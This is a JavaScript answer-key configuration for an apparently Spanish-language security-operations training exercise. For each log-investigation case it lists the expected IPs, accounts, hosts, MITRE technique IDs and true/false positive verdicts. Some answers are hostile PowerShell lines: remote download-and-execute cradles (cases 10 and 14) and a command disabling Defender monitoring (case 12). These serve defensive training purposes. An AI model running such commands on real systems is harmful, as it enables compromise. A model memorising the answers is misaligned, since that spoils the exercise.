const VALIDATION_CONFIG = {
  // Caso 01 - Fácil
  "1-0": { answer: "185.220.101.7", acceptable: [] },
  "1-1": { answer: "mgarcia", acceptable: [] },
  "1-2": { answer: "SRV-PROXY01", acceptable: ["srv-proxy01"] },
  "1-3": { answer: "T1110", acceptable: ["t1110", "Brute Force", "fuerza bruta", "1110"] },
  "1-4": { answer: "test", acceptable: [] },
  "1-5": { answer: "5715", acceptable: [] },
  "1-6": { answer: "3", acceptable: ["tres", "3 intentos", "tres intentos"] },
  "1-7": { answer: "PAM: session opened", acceptable: ["session opened", "5501"] },
  "1-8": { answer: "45.33.22.11", acceptable: [] },
  "1-9": { answer: "jcorrales", acceptable: [] },

  // Caso 02 - Fácil
  "2-0": { answer: "198.51.100.10", acceptable: [] },
  "2-1": { answer: "jcorrales", acceptable: [] },       // Cambiado de mgarcia
  "2-2": { answer: "svc_backup_pro", acceptable: [] },
  "2-3": { answer: "Domain Admins", acceptable: ["domain admins", "Administradores del dominio"] },
  "2-4": { answer: "4720", acceptable: [] },
  "2-5": { answer: "4732", acceptable: [] },
  "2-6": { answer: "03:15:20", acceptable: ["03:15", "3:15"] },
  "2-7": { answer: "T1136.001", acceptable: ["t1136.001", "T1136", "Create Account"] },
  "2-8": { answer: "amorales", acceptable: [] },
  "2-9": { answer: "10", acceptable: ["10 (RDP)", "RDP"] },

    // Caso 03 - Fácil
  "3-0": { answer: "192.0.2.55", acceptable: [] },
  "3-1": { answer: "hsanchez", acceptable: [] },
  "3-2": { answer: "SRV-APP01", acceptable: ["srv-app01"] },
  "3-3": { answer: "UpdateService", acceptable: ["updateService"] },
  "3-4": { answer: "C:\\Windows\\Temp\\update.exe", acceptable: ["c:\\windows\\temp\\update.exe"] },
  "3-5": { answer: "4697", acceptable: [] },
  "3-6": { answer: "T1543.003", acceptable: ["t1543.003", "T1543", "Create or Modify System Process", "Windows Service"] },
  "3-7": { answer: "10", acceptable: ["10 (RDP)", "RDP"] },
  "3-8": { answer: "4672", acceptable: [] },
  "3-9": { answer: "amorales", acceptable: [] },


  // Caso 4 - Fácil
  "4-0": { answer: "lgomez", acceptable: [] },
  "4-1": { answer: "FIN-DESK-22", acceptable: [] },
  "4-2": { answer: "WINWORD.EXE", acceptable: ["C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"] },
  "4-3": { answer: "185.215.113.89", acceptable: [] },
  "4-4": { answer: "office-verify-tenant.com", acceptable: [] },
  "4-5": { answer: "T1204", acceptable: ["User Execution", "T1204.002"] },
  "4-6": { answer: "T1053.005", acceptable: ["Scheduled Task", "T1053"] },
  "4-7": { answer: "UpdateTask", acceptable: ["\\UpdateTask"] },
  "4-8": { answer: "1", acceptable: ["1", "Sysmon 1"] },
  "4-9": { answer: "03:15:00", acceptable: ["03:15", "3:15 AM"] },


  // Caso 5 - Fácil
  "5-0": { answer: "hsanchez", acceptable: [] },
  "5-1": { answer: "IT-WS-07", acceptable: [] },
  "5-2": { answer: "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", acceptable: ["HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Run"] },
  "5-3": { answer: "Updater", acceptable: [] },
  "5-4": { answer: "powershell.exe", acceptable: ["PowerShell", "powershell"] },
  "5-5": { answer: "13", acceptable: ["13", "Sysmon13"] },
  "5-6": { answer: "T1547.001", acceptable: ["T1547", "Boot or Logon Autostart Execution"] },
  "5-7": { answer: "reg.exe", acceptable: ["reg.exe"] },
  "5-8": { answer: "02:30:00", acceptable: ["02:30", "2:30 AM"] },
  "5-9": { answer: "script.ps1", acceptable: ["C:\\Users\\hsanchez\\Desktop\\script.ps1"] },





    // Caso 10 - Medio
  "10-0": { answer: "154.16.170.40", acceptable: [] },
  "10-1": { answer: "lgomez", acceptable: [] },
  "10-2": { answer: "FIN-DESK-22", acceptable: ["fin-desk-22"] },
  "10-3": { answer: "WINWORD.EXE", acceptable: ["winword.exe", "winword"] },
  "10-4": { answer: "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('https://154.16.170.40/script.ps1')\"", acceptable: [] },
  "10-5": { answer: "update.exe", acceptable: ["update"] },
  "10-6": { answer: "T1566.001", acceptable: ["T1566", "Spearphishing Attachment", "phishing"] },
  "10-7": { answer: "T1204.002", acceptable: ["T1204", "User Execution", "malicious file"] },
  "10-8": { answer: "Tarea programada", acceptable: ["scheduled task", "schtasks", "T1053.005"] },
  "10-9": { answer: "Verdadero Positivo", acceptable: ["Verdadero Positivo", "VP", "vp", "verdadero positivo"] },

    // Caso 11 - Medio
  "11-0": { answer: "185.150.99.100", acceptable: [] },
  "11-1": { answer: "svc_backup", acceptable: [] },
  "11-2": { answer: "SRV-FS01", acceptable: ["srv-fs01"] },
  "11-3": { answer: "rclone.exe", acceptable: ["rclone"] },
  "11-4": { answer: "backupcloud.io", acceptable: [] },
  "11-5": { answer: "BackupToCloud", acceptable: ["backuptocloud"] },
  "11-6": { answer: "02:00", acceptable: ["2:00"] },
  "11-7": { answer: "rclone", acceptable: ["rclone.exe"] },
  "11-8": { answer: "T1048", acceptable: ["T1048", "Exfiltration", "Exfiltración"] },
  "11-9": { answer: "Falso Positivo", acceptable: ["Falso Positivo", "FP", "fp", "falso positivo"] },



    // Caso 12 - Medio
    "12-0": { answer: "10.20.6.3", acceptable: [] },
  "12-1": { answer: "hsanchez", acceptable: [] },
  "12-2": { answer: "mgarcia", acceptable: [] },
  "12-3": { answer: "IT-ADMIN-05", acceptable: ["it-admin-05"] },
  "12-4": { answer: "SRV-DC01", acceptable: ["srv-dc01"] },
  "12-5": { answer: "Set-MpPreference -DisableRealtimeMonitoring $true", acceptable: ["disable realtime monitoring", "deshabilitar defender"] },
  "12-6": { answer: "vssadmin.exe", acceptable: ["vssadmin"] },
  "12-7": { answer: "T1078", acceptable: ["T1078", "Valid Accounts", "cuentas válidas"] },
  "12-8": { answer: "T1021.001", acceptable: ["T1021", "Remote Desktop", "RDP", "T1021.001"] },
  "12-9": { answer: "Verdadero Positivo", acceptable: ["Verdadero Positivo", "VP", "vp", "verdadero positivo"] },


  // Caso 13 - Medio
  "13-0": { answer: "rundll32.exe", acceptable: ["rundll32"] },
  "13-1": { answer: "C:\\DevTools\\deploy.dll", acceptable: [] },
  "13-2": { answer: "dmendoza", acceptable: [] },
  "13-3": { answer: "DEV-WS-01", acceptable: ["dev-ws-01"] },
  "13-4": { answer: "rundll32.exe C:\\DevTools\\deploy.dll,Install", acceptable: [] },
  "13-5": { answer: "cmd.exe", acceptable: ["cmd"] },
  "13-6": { answer: "build_deploy.bat", acceptable: ["build_deploy"] },
  "13-7": { answer: "T1218.011", acceptable: ["T1218", "Signed Binary Proxy Execution", "Rundll32"] },
  "13-8": { answer: "C:\\DevTools\\", acceptable: ["DevTools", "C:\\DevTools"] },
  "13-9": { answer: "Falso Positivo", acceptable: ["Falso Positivo", "FP", "fp", "falso positivo"] },

  // Caso 14 - Medio
  "14-0": { answer: "45.155.205.33", acceptable: [] },
  "14-1": { answer: "mgarcia", acceptable: [] },
  "14-2": { answer: "SRV-VPN01", acceptable: ["srv-vpn01"] },
  "14-3": { answer: "T1110", acceptable: ["t1110", "Brute Force", "fuerza bruta", "1110"] },
  "14-4": { answer: "T1078", acceptable: ["T1078", "Valid Accounts", "cuentas válidas"] },
  "14-5": { answer: "15", acceptable: ["quince", "15 intentos"] },
  "14-6": { answer: "admin", acceptable: [] },
  "14-7": { answer: "powershell.exe -Command \"Invoke-WebRequest -Uri http://45.155.205.33/payload.ps1 -OutFile C:\\Temp\\payload.ps1; C:\\Temp\\payload.ps1\"", acceptable: [] },
  "14-8": { answer: "45.155.205.33", acceptable: ["http://45.155.205.33"] },
  "14-9": { answer: "Verdadero Positivo", acceptable: ["Verdadero Positivo", "VP", "vp", "verdadero positivo"] },





  // Caso 21 - Dificil

  "21-0": { answer: "185.220.101.7", acceptable: [] },
  "21-1": { answer: "amorales", acceptable: [] },
  "21-2": { answer: "IT-ADMIN-05", acceptable: ["it-admin-05"] },
  "21-3": { answer: "T1078", acceptable: ["t1078", "Valid Accounts", "cuentas válidas"] },
  "21-4": { answer: "svc_sql", acceptable: [] },
  "21-5": { answer: "powershell.exe", acceptable: ["powershell"] },
  "21-6": { answer: "cdn-update.azureedge.net", acceptable: [] },
  "21-7": { answer: "4698", acceptable: [] },
  "21-8": { answer: "3", acceptable: [] },
  "21-9": { answer: "Verdadero Positivo", acceptable: ["VP", "vp", "verdadero positivo"] }
};